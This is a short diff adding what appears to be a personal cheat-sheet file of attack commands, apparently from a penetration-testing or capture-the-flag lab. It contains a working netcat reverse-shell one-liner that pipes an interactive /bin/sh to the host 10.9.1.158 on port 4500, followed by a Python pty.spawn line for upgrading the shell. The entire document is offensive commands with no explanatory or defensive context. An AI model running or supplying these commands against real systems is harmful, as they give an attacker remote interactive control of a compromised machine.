@@ -1,0 +1,5 @@
+Reverse Shell:
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.158 4500 >/tmp/f
+
+Prettier Shell:
+python -c 'import pty;pty.spawn("/bin/bash")'
